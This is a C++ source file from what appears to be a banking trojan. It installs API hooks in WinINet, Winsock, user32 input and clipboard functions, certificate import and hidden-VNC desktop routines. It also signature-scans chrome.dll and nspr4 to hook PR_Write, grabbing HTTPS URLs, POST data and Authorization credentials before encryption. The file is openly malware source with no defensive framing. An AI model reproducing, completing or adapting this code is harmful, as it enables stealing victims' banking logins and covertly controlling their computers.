#pragma once
#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>
#include <ws2tcpip.h>

#include "defines.h"
#include "core.h"
#include "winapitables.h"
#include "corehook.h"
#include "sockethook.h"
#include "userhook.h"
#include "certstorehook.h"
#include "vnc\vncserver.h"
#include "wininethook.h"
#include "nspr4hook.h"
#include "..\common\str.h"
#include "..\common\disasm.h"
#include "..\common\httptools.h"
#include "httpgrabber.h"
#include "dynamicconfig.h"
#include "localconfig.h"
#include "cryptedstrings.h"

#include "..\common\wahook.h"
#include "..\common\peimage.h"
#include "..\common\process.h"
#include "..\common\debug.h"
#include "globals.h"
#include "bank_catch.h"


static HOOKWINAPI userHooks[] =
{
  {NULL, NULL,                                          NULL, 0},
#if defined(HOOKER_NTRESUMETHREAD)
  {NULL, CoreHook::hookerNtResumeThread,                NULL, 0},
#endif
#if defined(HOOKER_LDRLOADDLL)
  {NULL, CoreHook::hookerLdrLoadDll,                    NULL, 0},
#endif                                      

#if defined NTQUERYDIRECTORYFILE
  {NULL, CoreHook::hookerNtQueryDirectoryFile,          NULL, 0},
#endif

#if defined HOOKER_NTCREATEFILE
  {NULL, CoreHook::hookerNtCreateFile,                  NULL, 0},
#endif

  {NULL, CoreHook::hookerGetFileAttributesExW,          NULL, 0},

#if defined HOOKER_NTREADPROCESSMEMORY
  {NULL, CoreHook::hookerNtReadVirtualMemory,           NULL, 0},
#endif

#if defined HOOKER_NTQUERYVIRTUALMEMORY
  {NULL, CoreHook::hookerNtQueryVirtualMemory,          NULL, 0},
#endif


#if(BO_WININET > 0)
  {NULL, WininetHook::hookerHttpSendRequestW,           NULL, 0},
  {NULL, WininetHook::hookerHttpSendRequestA,           NULL, 0},
  {NULL, WininetHook::hookerHttpSendRequestExW,         NULL, 0},
  {NULL, WininetHook::hookerHttpSendRequestExA,         NULL, 0},
  {NULL, WininetHook::hookerInternetCloseHandle,        NULL, 0},
  {NULL, WininetHook::hookerInternetReadFile,           NULL, 0},
  {NULL, WininetHook::hookerInternetReadFileExA,        NULL, 0},
  {NULL, WininetHook::hookerInternetQueryDataAvailable, NULL, 0},
  {NULL, WininetHook::hookerHttpQueryInfoA,             NULL, 0},
#endif

#if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
  {NULL, SocketHook::hookerCloseSocket,                 NULL, 0},
  {NULL, SocketHook::hookerSend,                        NULL, 0},
  {NULL, SocketHook::hookerWsaSend,                     NULL, 0},
#endif
#if defined USE_TOR
  {NULL, SocketHook::hookerconnect,                     NULL, 0},
  {NULL, SocketHook::hookerWSAConnect,                  NULL, 0},
  {NULL, SocketHook::hookergetaddrinfo,                 NULL, 0},
  {NULL, SocketHook::hookerGetAddrInfoW,                NULL, 0},
  {NULL, SocketHook::hookergethostbyname,               NULL, 0},
  {NULL, SocketHook::hookerWSAAsyncGetHostByName,       NULL, 0},
#endif

#if(BO_VNC > 0)
  {NULL, VncServer::hookerOpenInputDesktop,             NULL, 0},
  {NULL, VncServer::hookerSwitchDesktop,                NULL, 0},
  {NULL, VncServer::hookerDefWindowProcW,               NULL, 0},
  {NULL, VncServer::hookerDefWindowProcA,               NULL, 0},
  {NULL, VncServer::hookerDefDlgProcW,                  NULL, 0},
  {NULL, VncServer::hookerDefDlgProcA,                  NULL, 0},
  {NULL, VncServer::hookerDefFrameProcW,                NULL, 0},
  {NULL, VncServer::hookerDefFrameProcA,                NULL, 0},
  {NULL, VncServer::hookerDefMDIChildProcW,             NULL, 0},
  {NULL, VncServer::hookerDefMDIChildProcA,             NULL, 0},
  {NULL, VncServer::hookerCallWindowProcW,              NULL, 0},
  {NULL, VncServer::hookerCallWindowProcA,              NULL, 0},

  {NULL, VncServer::hookerRegisterClassW,               NULL, 0},
  {NULL, VncServer::hookerRegisterClassA,               NULL, 0},
  {NULL, VncServer::hookerRegisterClassExW,             NULL, 0},
  {NULL, VncServer::hookerRegisterClassExA,             NULL, 0},

  {NULL, VncServer::hookerBeginPaint,                   NULL, 0},
  {NULL, VncServer::hookerEndPaint,                     NULL, 0},
  {NULL, VncServer::hookerGetDcEx,                      NULL, 0},
  {NULL, VncServer::hookerGetDc,                        NULL, 0},
  {NULL, VncServer::hookerGetWindowDc,                  NULL, 0},
  {NULL, VncServer::hookerReleaseDс,                    NULL, 0},
  {NULL, VncServer::hookerGetUpdateRect,                NULL, 0},
  {NULL, VncServer::hookerGetUpdateRgn,                 NULL, 0},
  
  {NULL, VncServer::hookerGetMessagePos,                NULL, 0},
  {NULL, VncServer::hookerGetCursorPos,                 NULL, 0},
  {NULL, VncServer::hookerSetCursorPos,                 NULL, 0},
  {NULL, VncServer::hookerSetCapture,                   NULL, 0},
  {NULL, VncServer::hookerReleaseCapture,               NULL, 0},
  {NULL, VncServer::hookerGetCapture,                   NULL, 0},
  {NULL, VncServer::hookerGetMessageW,                  NULL, 0},
  {NULL, VncServer::hookerGetMessageA,                  NULL, 0},
  {NULL, VncServer::hookerPeekMessageW,                 NULL, 0},
  {NULL, VncServer::hookerPeekMessageA,                 NULL, 0},
#endif

  {NULL, UserHook::hookerTranslateMessage,              NULL, 0},
  {NULL, UserHook::hookerGetClipboardData,              NULL, 0},
# if defined HOOKER_SETWINDOWTEXT
  {NULL, UserHook::hookerSetWindowTextW,                NULL, 0},
# endif

  {NULL, CertStoreHook::_hookerPfxImportCertStore,      NULL, 0},
};

//PRFileDesc.
typedef struct
{
  void *methods;
  void *secret;
  void *lower, *higher;
  void ( *dtor)(void *fd);
  int identity;
}PRFILEDESC;

typedef int (__cdecl *PR_WRITE1)(void *fd, const void *buf, __int32 amount);
static PR_WRITE1 prwrite;


void WinApiTables::init(void)
{

}

void WinApiTables::uninit(void)
{

}

/*
  Выбор функций для уведомлении о создании процесса.

  OUT hwa - результат выбора.
*/
static void setCreateProcessNotifyApi(HOOKWINAPI *hwa)
{
  if(coreData.ntdllApi.ntCreateUserProcess != NULL)
  {
    hwa->functionForHook = coreData.ntdllApi.ntCreateUserProcess;
    hwa->hookerFunction  = CoreHook::hookerNtCreateUserProcess;
  }
  else /*if(coreData.ntdllApi.ntCreateThread != NULL) //Обе функции не могут быть NULL, см. Core::init()*/
  {
    hwa->functionForHook = coreData.ntdllApi.ntCreateThread;
    hwa->hookerFunction  = CoreHook::hookerNtCreateThread;
  }
}

/*
  Снимает перехватыват со всеx WinApi из списка

  IN process            - процесс.
  IN OUT list           - список.
  IN count              - кол. эелементов.

  Return                - true - если снять перехват со всех WinApi,
                          false - если не снят перехват хотя бы с одной WinAPI.
*/
static bool unhookList(HANDLE process, HOOKWINAPI *list, DWORD count)
{
  bool ok = true; 
  for(DWORD i = 0; i < count; i++)if(list[i].originalFunction != NULL)
  {
    if(!WaHook::_unhook(process, list[i].functionForHook, list[i].originalFunction, list[i].originalFunctionSize))
    {
      ok = false;
#     if defined WDEBUG1
      WDEBUG1(WDDT_ERROR, "Failed to unhook WinApi at index %u", i);
#     endif
    }
    /*else
    {
      PeImage::_repalceImportFunction(coreData.modules.current, list[i].originalFunction, list[i].functionForHook);
      Core::replaceFunction(list[i].originalFunction, list[i].functionForHook);
    }*/
  }
  return ok;
}

static void hotPatchCallback(const void *functionForHook, const void *originalFunction)
{
  PeImage::_repalceImportFunction(coreData.modules.current, functionForHook, originalFunction);
  Core::replaceFunction(functionForHook, originalFunction);
}

/*
  Перехватывает все WinApi из списка

  IN process            - процесс.
  IN OUT list           - список.
  IN count              - кол. эелементов.
  IN realCount          - кол. эелементов, должны быть равны. Смысл это понятен в коде.

  Return                - true - если перехвачены все WinApi,
                          false - если не перехвачена хотя бы одна WinAPI.
*/
static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCount)
{
  //Страхуемся.
  if(count != realCount)
  {
#   if defined WDEBUG2
    WDEBUG2(WDDT_ERROR, "count != realCount, %u != %u", count, realCount);
#   endif
    return false;
  }

  //Обнуляем структуру на всякий случай.
  for(DWORD i = 0; i < count; i++)
  {
    if(list[i].functionForHook == NULL)
    {
#     if defined WDEBUG1
      WDEBUG1(WDDT_ERROR, "NULL WinApi founded at index %u", i);
#     endif
      return false;
    }
    list[i].originalFunction    = NULL;
    list[i].originalFunctionSize = 0;
  }
  
  LPBYTE opcodesBuf = (LPBYTE)WaHook::_allocBuffer(process, count);
  if(opcodesBuf != NULL)
  {
    //Ставим хуки.    
    DWORD i = 0;
    for(; i < count; i++)
    {
      DWORD curOpcodesSize = WaHook::_hook(process, list[i].functionForHook, list[i].hookerFunction, opcodesBuf, hotPatchCallback);
      if(curOpcodesSize == 0)
      {
#      if defined WDEBUG1
        WDEBUG1(WDDT_ERROR, "Failed to hook WinApi at index %u", i);
#       endif
        break;
      }
      
      list[i].originalFunction     = opcodesBuf;
      list[i].originalFunctionSize = curOpcodesSize;
      
      opcodesBuf += curOpcodesSize;
    }

    if(i == count)return true;
      
    //Снимаем хуки.
    unhookList(process, list, count);
  }
  
  return false;
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Таблица перехвата для пользовательского процесса.
////////////////////////////////////////////////////////////////////////////////////////////////////


bool WinApiTables::_setUserHooks(void)
{
  DWORD i = 0;

  setCreateProcessNotifyApi(&userHooks[i++]);
  
#if defined (HOOKER_NTRESUMETHREAD)
  userHooks[i++].functionForHook = coreData.ntdllApi.ntResumeThread;
#endif
#if defined HOOKER_LDRLOADDLL
  userHooks[i++].functionForHook = coreData.ntdllApi.ldrLoadDll;
#endif
#if defined NTQUERYDIRECTORYFILE
  userHooks[i++].functionForHook = coreData.ntdllApi.ntQueryDirectoryFile;
#endif
#if defined HOOKER_NTCREATEFILE
  userHooks[i++].functionForHook = coreData.ntdllApi.ntCreateFile;  
#endif
  userHooks[i++].functionForHook = CWA(kernel32, GetFileAttributesExW);

#if defined HOOKER_NTREADPROCESSMEMORY
  userHooks[i++].functionForHook = coreData.ntdllApi.ntNtReadVirtualMemory;
#endif

#if defined HOOKER_NTQUERYVIRTUALMEMORY
  userHooks[i++].functionForHook = coreData.ntdllApi.ntNtQueryVirtualMemory;
#endif
	
#if(BO_WININET > 0)
  userHooks[i++].functionForHook = CWA(wininet, HttpSendRequestW);
  userHooks[i++].functionForHook = CWA(wininet, HttpSendRequestA);
  userHooks[i++].functionForHook = CWA(wininet, HttpSendRequestExW);
  userHooks[i++].functionForHook = CWA(wininet, HttpSendRequestExA);
  userHooks[i++].functionForHook = CWA(wininet, InternetCloseHandle);
  userHooks[i++].functionForHook = CWA(wininet, InternetReadFile);
  userHooks[i++].functionForHook = CWA(wininet, InternetReadFileExA);
  userHooks[i++].functionForHook = CWA(wininet, InternetQueryDataAvailable);
  userHooks[i++].functionForHook = CWA(wininet, HttpQueryInfoA);
#endif

#if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
  userHooks[i++].functionForHook = CWA(ws2_32, closesocket);
  userHooks[i++].functionForHook = CWA(ws2_32, send);
  userHooks[i++].functionForHook = CWA(ws2_32, WSASend);
#endif
#if defined USE_TOR
  userHooks[i++].functionForHook = CWA(ws2_32, connect);
  userHooks[i++].functionForHook = CWA(ws2_32, WSAConnect);
  userHooks[i++].functionForHook = CWA(ws2_32, getaddrinfo);
  userHooks[i++].functionForHook = CWA(ws2_32, GetAddrInfoW);
  userHooks[i++].functionForHook = CWA(ws2_32, gethostbyname);
  userHooks[i++].functionForHook = CWA(ws2_32, WSAAsyncGetHostByName);
#endif

#if(BO_VNC > 0)
  userHooks[i++].functionForHook = CWA(user32, OpenInputDesktop);
  userHooks[i++].functionForHook = CWA(user32, SwitchDesktop);
  userHooks[i++].functionForHook = CWA(user32, DefWindowProcW);
  userHooks[i++].functionForHook = CWA(user32, DefWindowProcA);
  userHooks[i++].functionForHook = CWA(user32, DefDlgProcW);
  userHooks[i++].functionForHook = CWA(user32, DefDlgProcA);
  userHooks[i++].functionForHook = CWA(user32, DefFrameProcW);
  userHooks[i++].functionForHook = CWA(user32, DefFrameProcA);
  userHooks[i++].functionForHook = CWA(user32, DefMDIChildProcW);
  userHooks[i++].functionForHook = CWA(user32, DefMDIChildProcA);
  userHooks[i++].functionForHook = CWA(user32, CallWindowProcW);
  userHooks[i++].functionForHook = CWA(user32, CallWindowProcA);
  
  userHooks[i++].functionForHook = CWA(user32, RegisterClassW);
  userHooks[i++].functionForHook = CWA(user32, RegisterClassA);
  userHooks[i++].functionForHook = CWA(user32, RegisterClassExW);
  userHooks[i++].functionForHook = CWA(user32, RegisterClassExA);

  userHooks[i++].functionForHook = CWA(user32, BeginPaint);
  userHooks[i++].functionForHook = CWA(user32, EndPaint);
  userHooks[i++].functionForHook = CWA(user32, GetDCEx);
  userHooks[i++].functionForHook = CWA(user32, GetDC);
  userHooks[i++].functionForHook = CWA(user32, GetWindowDC);
  userHooks[i++].functionForHook = CWA(user32, ReleaseDC);
  userHooks[i++].functionForHook = CWA(user32, GetUpdateRect);
  userHooks[i++].functionForHook = CWA(user32, GetUpdateRgn);
  
  userHooks[i++].functionForHook = CWA(user32, GetMessagePos);
  userHooks[i++].functionForHook = CWA(user32, GetCursorPos);
  userHooks[i++].functionForHook = CWA(user32, SetCursorPos);
  userHooks[i++].functionForHook = CWA(user32, SetCapture);
  userHooks[i++].functionForHook = CWA(user32, ReleaseCapture);
  userHooks[i++].functionForHook = CWA(user32, GetCapture);
  userHooks[i++].functionForHook = CWA(user32, GetMessageW);
  userHooks[i++].functionForHook = CWA(user32, GetMessageA);
  userHooks[i++].functionForHook = CWA(user32, PeekMessageW);
  userHooks[i++].functionForHook = CWA(user32, PeekMessageA);
#endif

  userHooks[i++].functionForHook = CWA(user32, TranslateMessage);
  userHooks[i++].functionForHook = CWA(user32, GetClipboardData);
# if defined HOOKER_SETWINDOWTEXT
  userHooks[i++].functionForHook = CWA(user32, SetWindowTextW);
# endif

  userHooks[i++].functionForHook = CWA(crypt32, PFXImportCertStore);
  CoreHook::set_uHooks(userHooks, i);
  //Хукаем.
  return hookList(CURRENT_PROCESS, userHooks, i, sizeof(userHooks) / sizeof(HOOKWINAPI));
}

bool WinApiTables::_removeUserHooks(void)
{
  return unhookList(CURRENT_PROCESS, userHooks, sizeof(userHooks) / sizeof(HOOKWINAPI));
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Таблица перехвата для nspr4.dll.
////////////////////////////////////////////////////////////////////////////////////////////////////

#if(BO_NSPR4 > 0)
#define DLL_NSPR4 L"nspr4.dll"
#define DLL_CHROME L"chrome.dll"



Splice ChromeHook;

void* kiFastOrig=0;
void* KiFastSystemCallOrig=0;

void Hooked_PR_Write_tramp(DWORD *fd,  void *buf,DWORD amount);
void KiFastHook(void);
/*__declspec( naked ) void KiFastHook(void)
{

	__asm 
	{
		mov edx,esp;
		cmp eax,91h;
		jnz not_hooking;
		push dword ptr [esp+1Ch];
not_hooking:
		jmp KiFastSystemCallOrig;
	}

}
*/


bool SetSSLHook(HMODULE moduleHandle)
{
	DWORD Chrome32Size = (DWORD)Disasm::GetModuleSize(moduleHandle);
	DWORD ChromeDLL = (DWORD)GetModuleHandleW(L"chrome.dll");
	WDEBUG2(WDDT_INFO, "Chrome32Size=\"0x%08X\", ChromeDLL=\"%u\"", Chrome32Size, ChromeDLL);
	

	if (!Chrome32Size){
		MessageBoxA(NULL,(LPCSTR)"err",(LPCSTR)"569",MB_OK);
		return false;
	}
	if (!ChromeDLL){
		MessageBoxA(NULL,(LPCSTR)"NULL 573 l",(LPCSTR)"sd",MB_OK);
		return false;
	}
	char* Sign="\x55\x8B\xEC\xFF\x75\x10\x8B\x45\x08\xFF\x75\x0C\x8B\x08\x50\xFF\x51\x0C\x83";// Сигнатура PR_Write
	char* Mask="xxxxxxxxxxxxxxxxxxx";
    DWORD PR_Writeaddr = Disasm::FindPattern(ChromeDLL,Chrome32Size,(BYTE*)Sign,Mask);
	WDEBUG1(WDDT_INFO, "PR_Writeaddr=\"0x%08X\"", PR_Writeaddr);
	WDEBUG1(WDDT_INFO, "PR_WriteTrampaddr=\"0x%08X\"", (void*)Hooked_PR_Write_tramp);

	if (!PR_Writeaddr) {
		MessageBoxA(NULL,(LPCSTR)"NULL 580 l",(LPCSTR)"sd",MB_OK);
		return false;
	}


	LPBYTE opcodesBuf = (LPBYTE)WaHook::_allocBuffer(GetCurrentProcess(), 1);
	  if(opcodesBuf != NULL)
	  {
		
		  DWORD curOpcodesSize = WaHook::_hook(GetCurrentProcess(), (void*)PR_Writeaddr, Hooked_PR_Write_tramp, opcodesBuf, hotPatchCallback);
		  if(curOpcodesSize == 0)
		  {
	#      if defined WDEBUG1
			WDEBUG0(WDDT_ERROR, "SETSSLHOOK FAILED!!!");
	#      endif
		  }
      
		  ChromeHook.buffer = opcodesBuf;

	  }


	return true;
}

static HOOKWINAPI nspr4Hooks[] =
{
  {NULL, Nspr4Hook::hookerPrOpenTcpSocket, NULL, 0},
  {NULL, Nspr4Hook::hookerPrClose,         NULL, 0},
  {NULL, Nspr4Hook::hookerPrRead,          NULL, 0},
  {NULL, Nspr4Hook::hookerPrWrite,         NULL, 0}
};

DWORD _GetFuncAddress(LPWSTR module, char* sign, char* mask)
{
	HMODULE hModule = GetModuleHandleW(module);
	DWORD moduleSize = (DWORD)Disasm::GetModuleSize(hModule);
	WDEBUG2(WDDT_INFO, "moduleSize=\"0x%08X\", hModule=\"%u\"", moduleSize, (DWORD)hModule);

	if (!moduleSize){
		MessageBoxA(NULL,(LPCSTR)"err",(LPCSTR)"569",MB_OK);
		return 0;
	}
	if (!hModule){
		MessageBoxA(NULL,(LPCSTR)"NULL 573 l",(LPCSTR)"sd",MB_OK);
		return 0;
	}
	
    DWORD PR_Writeaddr = Disasm::FindPattern((DWORD)hModule,moduleSize,(BYTE*)sign,mask);
	return PR_Writeaddr;
}

bool WinApiTables::_trySetNspr4Hooks(void)
{
	/*DWORD oldprot;
	kiFastOrig = (void*)_GetFuncAddress(L"ntdll.dll", "\x8B\xD4\x0F\x34\xC3", "xxxxx");
	KiFastSystemCallOrig = (BYTE*)kiFastOrig + 2;
	WDEBUG1(WDDT_INFO, "KiFastSystemCallOrig: \"0x%08X\"", KiFastSystemCallOrig);
	if(VirtualProtect(kiFastOrig,20,PAGE_EXECUTE_READWRITE, &oldprot) != 0)
	{
		//WDEBUG0(WDDT_INFO,"EKANQ STE");
		//*((LPBYTE)(kiFastOrig)) = 0xEB;
		//*((LPBYTE)(kiFastOrig)+1) = 0x03;
		*((LPBYTE)(kiFastOrig)+5) = 0xE9;
		*((DWORD *)((LPBYTE)(kiFastOrig) + 6)) = (DWORD)((DWORD_PTR)(KiFastHook) - ((DWORD_PTR)(kiFastOrig)+5) - 5);
		*((LPBYTE)(kiFastOrig)+10) = 0x90;
		*((LPBYTE)(kiFastOrig)+11) = 0x90;
		
		//WDEBUG0(WDDT_INFO, "EKAV");
		VirtualProtect(kiFastOrig,20,oldprot,&oldprot);
	}

	WDEBUG2(WDDT_INFO, "KIFAST_ADDR: \"0x%08X\", \"0x%08X\"", KiFastHook, kiFastOrig);*/
	WDEBUG0(WDDT_INFO, "Trying to set hook nspr4");
	HMODULE module = CWA(kernel32, GetModuleHandleW)(DLL_NSPR4);
	return module != NULL ? _setNspr4Hooks(module) : false;
}

bool WinApiTables::_trySetNspr4HooksEx(LPWSTR moduleName, HMODULE moduleHandle)
{
	
	if(Str::_findSubStringW(moduleName,DLL_NSPR4)!=NULL) {
		WDEBUG0(WDDT_INFO, "trySetNspr4HooksEx returned true");
		return _setNspr4Hooks(moduleHandle);
	}
	if(Str::_findSubStringW(moduleName,L"chrome.dll")!=NULL){
		WDEBUG0(WDDT_INFO, "trySetNspr4HooksEx chrome.dll was found");
		return _setChromeHooks(moduleHandle);
	}

	return false;
}

bool WinApiTables::_setChromeHooks(HMODULE moduleHandle)
{
	bool ok;
	ok = SetSSLHook(moduleHandle);
	
	if(!ok)WDEBUG0(WDDT_INFO, "SSL NOT Hooked");
	else
		WDEBUG0(WDDT_INFO, "SSL Hooked");

  //Хукаем.

  return ok;
}

bool WinApiTables::_setNspr4Hooks(HMODULE nspr4Handle)
{
  DWORD i = 0;
  
  CSTR_GETA(pr_opentcpsocket,nspr4_pr_open_tcp_socket);
  CSTR_GETA(pr_close,nspr4_pr_close);
  CSTR_GETA(pr_read,nspr4_pr_read);
  CSTR_GETA(pr_write, nspr4_pr_write);
  nspr4Hooks[i++].functionForHook = CWA(kernel32, GetProcAddress)(nspr4Handle, pr_opentcpsocket);
  nspr4Hooks[i++].functionForHook = CWA(kernel32, GetProcAddress)(nspr4Handle, pr_close);
  nspr4Hooks[i++].functionForHook = CWA(kernel32, GetProcAddress)(nspr4Handle, pr_read);
  nspr4Hooks[i++].functionForHook = CWA(kernel32, GetProcAddress)(nspr4Handle, pr_write);
  
  //Хукаем.
  bool ok = hookList(CURRENT_PROCESS, nspr4Hooks, i, sizeof(nspr4Hooks) / sizeof(HOOKWINAPI));
  
  if(ok) 
  {
	  Nspr4Hook::updateAddresses(nspr4Handle, nspr4Hooks[0].originalFunction, nspr4Hooks[1].originalFunction, nspr4Hooks[2].originalFunction, nspr4Hooks[3].originalFunction);
	  bank::init();
	  
  }
  return ok;
}
#endif
void* buffer1;
DWORD fd1;
DWORD amount1;
  LPSTR version;
  DWORD versionSize;
  LPSTR uri;
  DWORD uriSize;
  LPSTR host;
  DWORD hostSize;
  LPSTR method;
  DWORD methodSize;
  LPSTR postData;
  DWORD postDataSize;
  LPSTR tmp;
  DWORD tmpSize;
  DWORD bytesToSkip = 0;
  int result=1;
  HttpGrabber::REQUESTDATA requestData;
  char number[11];
  bool sign;
__declspec( naked ) void  Hooked_PR_Write_tramp(DWORD *fd,  void *buf,DWORD amount)
{
// prolog
	__asm
	{
		push ebp;
		mov ebp,esp;
		push ebx;
		mov ebx,dword ptr SS:[ebp+10h];
		mov amount1,ebx;
		mov ebx,dword ptr SS:[ebp+4h];
		mov fd1,ebx;
		pop ebx;
		sub esp,0Ch;
		push ebx;
		push esi;
		push edi;
		mov buffer1,eax;
	}

	//MessageBoxA(NULL, (LPSTR)buffer1,(LPSTR)"caption",MB_OK);
	
	WDEBUG3(WDDT_INFO, "PR_WRITE HOOKED GOOGLE: %u, %u, %u", amount1, buffer1, fd1);
	/*if((postData = HttpTools::_getMimeHeader(buffer1, amount1, (LPSTR)HttpTools::GMH_DATA,         &postdatasize)) != NULL)
	{
		MessageBoxA(NULL, postData, "caption",MB_OK);
	}*/
	
	

	result = 1;
	if(bytesToSkip > 0)
	{
		postData = (LPSTR)buffer1;
		postDataSize = bytesToSkip;
		requestData.postData     = (void *)postData;
        requestData.postDataSize = postDataSize;
		bytesToSkip = 0;
		goto skip;
	}
		


	Mem::_zero(&requestData, sizeof(HttpGrabber::REQUESTDATA));

  //Проверяем ключевые данные.
  if((version  = HttpTools::_getMimeHeader(buffer1, amount1, (LPSTR)HttpTools::GMH_REQUEST_HTTP_VERSION, &versionSize))  == NULL || Str::_CompareA(version, "HTTP/1.1", versionSize, 8) != 0 ||
     (uri      = HttpTools::_getMimeHeader(buffer1, amount1, (LPSTR)HttpTools::GMH_HTTP_URI,     &uriSize))      == NULL || uriSize == 0    ||
     (method   = HttpTools::_getMimeHeader(buffer1, amount1, (LPSTR)HttpTools::GMH_HTTP_METHOD,  &methodSize))   == NULL || methodSize == 0 ||
     (host     = HttpTools::_getMimeHeader(buffer1, amount1, "Host",                             &hostSize))     == NULL || hostSize == 0   ||
     (postData = HttpTools::_getMimeHeader(buffer1, amount1, (LPSTR)HttpTools::GMH_DATA,         &postDataSize)) == NULL)
  {
	WDEBUG0(WDDT_ERROR, "skizb!");
    result=-1; //Ошибка протокола.
	goto skip;
  }
  
  //Вычисляем сколько байт нужно пропустить, до начала слежения следующего запроса.

  if((tmp = HttpTools::_getMimeHeader(buffer1, amount1, "Content-Length", &tmpSize)) != NULL)
  {
	  WDEBUG0(WDDT_INFO, "1-@ ancav");
	  if(tmpSize == 0 || tmpSize > sizeof("4294967295") - 1){result=-1;goto skip;}

    Str::_CopyA(number, tmp, tmpSize);
    bytesToSkip = Str::_ToInt32A(number, &sign);
    if(sign || bytesToSkip < postDataSize)
    { WDEBUG0(WDDT_INFO, "2-@ ancav");
#     if defined WDEBUG0
      WDEBUG0(WDDT_ERROR, "(bytesToSkip < postDataSize) == true.");
#     endif
      result=-1;
	  goto skip;
    }
    bytesToSkip -= postDataSize;
  }
  else if(postDataSize != 0)
  {
    //Длины нет, а POST-данные есть... Ошибка.
	  WDEBUG0(WDDT_INFO, "3-@ ancav");
    result=-1;  
	goto skip;
  }

#if defined WDEBUG2
  WDEBUG2(WDDT_INFO, "bytesToSkip=%i, postDataSize=%i", bytesToSkip, postDataSize);  
#endif

  //Теперь заполняем структуру нормально.
  {
    requestData.flags = HttpGrabber::RDF_NSPR4; 
    
    //URL.
    {
      LPSTR scheme     = "https://";
      DWORD schemeSize = 8;

      //Определяем HTTPS.
	  

      requestData.url = (LPSTR)Mem::alloc(8/*scheme*/ + hostSize + 1/*слеш*/ + uriSize);
	  if(requestData.url == NULL){goto skip;}
      
      //Scheme
      Mem::_copy(requestData.url, scheme, schemeSize);
      requestData.urlSize = schemeSize;
        
      //Хост. Порт является частью хоста.
      Mem::_copy(requestData.url + requestData.urlSize, host, hostSize);
      requestData.urlSize += hostSize;

      //Слеш
      if(*uri != '/')requestData.url[requestData.urlSize++] = '/';

       //URI.
      Mem::_copy(requestData.url + requestData.urlSize, uri, uriSize);
      requestData.urlSize += uriSize;

      requestData.url[requestData.urlSize] = 0;
    }

    //Реферер.
    if((tmp = HttpTools::_getMimeHeader(buffer1, amount1, "Referer", &tmpSize)) != NULL && tmpSize > 0)
    {
      requestData.referer     = Str::_CopyExA(tmp, tmpSize);
      requestData.refererSize = tmpSize;
    }
    
    //Verb.
    if(method[0] == 'P' && methodSize == 4)requestData.verb = HttpGrabber::VERB_POST;
    else if(method[0] == 'G' && methodSize == 3)requestData.verb = HttpGrabber::VERB_GET;
    else goto skip;

    //Content-Type.
    if((tmp = HttpTools::_getMimeHeader(buffer1, amount1, "Content-Type", &tmpSize)) != NULL && tmpSize > 0)
    {
      requestData.contentType     = Str::_CopyExA(tmp, tmpSize);
      requestData.contentTypeSize = tmpSize;
    }
    
    if(postDataSize > 0 && postDataSize <= HttpGrabber::MAX_POSTDATA_SIZE)
    {
      requestData.postData     = (void *)postData;
      requestData.postDataSize = postDataSize;
    }

    //Получаем данные авторизации.
    if((tmp = HttpTools::_getMimeHeader(buffer1, amount1, "Authorization", &tmpSize)) != NULL && tmpSize > 0)
    {
      if(!HttpTools::_parseAuthorization(tmp, tmpSize, &requestData.authorizationData.userName, &requestData.authorizationData.password))
      {
        requestData.authorizationData.unknownType = Str::_CopyExA(tmp, tmpSize);
      }
    }
    
    //Текущая конфигурация.
    requestData.dynamicConfig = DynamicConfig::getCurrent();
    requestData.localConfig   = LocalConfig::getCurrent();


  }

skip:
  //DWORD newRequestSize;
  //Запрос некорректный, игнарируем соединение.
        if(result == -1)
        {
          
#         if defined WDEBUG0
          WDEBUG0(WDDT_ERROR, "Protocol error detected.");
#         endif        
        }
        else 
        {
          //Запрос корректный, но он нам не интересен.
         
          
            DWORD analizeResult = HttpGrabber::analizeRequestData(&requestData);
            
			//newRequestSize = amount1;
			//newRequestSize = HttpTools::_modifyMimeHeader(buffer1, newRequestSize, "Accept-Encoding", "identity");//FIXME: добавить, если не сущетвует.
   //         newRequestSize = HttpTools::_removeMimeHeader(buffer1, newRequestSize, "TE");
   //         newRequestSize = HttpTools::_removeMimeHeader(buffer1, newRequestSize, "If-Modified-Since"); //Избавляемся чтением из кеша.
        }
		if(bytesToSkip<=0)
			HttpGrabber::_freeRequestData(&requestData);


	ChromeHook.GetBuffer();//Get trampoline
	__asm
	{
//epilog
		pop edi;
		pop esi;
		pop ebx;
		add esp,0Ch;
		mov esp,ebp;
		pop ebp;
		jmp eax;// Jump to trampoline
	}
}

